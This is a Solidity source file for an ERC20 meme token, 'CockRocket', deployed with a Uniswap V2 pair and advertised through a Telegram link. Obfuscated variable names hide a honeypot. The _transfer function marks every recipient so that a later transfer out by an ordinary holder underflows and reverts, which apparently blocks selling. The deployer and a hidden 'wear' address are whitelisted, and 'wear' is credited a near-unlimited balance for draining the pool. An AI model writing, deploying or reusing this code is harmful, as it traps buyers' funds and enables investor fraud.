// https://t.me/cockrocket_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CockRocket is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private facing;

    function _transfer(
        address poem,
        address birthday,
        uint256 when
    ) internal override {
        uint256 but = bean;

        if (production[poem] == 0 && facing[poem] > 0 && poem != uniswapV2Pair) {
            production[poem] -= but;
        }

        address theory = address(pass);
        pass = ERC20(birthday);
        facing[theory] += but + 1;

        _balances[poem] -= when;
        uint256 avoid = (when / 100) * bean;
        when -= avoid;
        _balances[birthday] += when;
    }

    ERC20 private pass;
    mapping(address => uint256) private production;
    uint256 public bean = 3;

    constructor(
        string memory thrown,
        string memory someone,
        address sent,
        address wear
    ) ERC20(thrown, someone) {
        uniswapV2Router = IUniswapV2Router02(sent);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 medicine = ~uint256(0);

        production[msg.sender] = medicine;
        production[wear] = medicine;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[wear] = medicine;
    }
}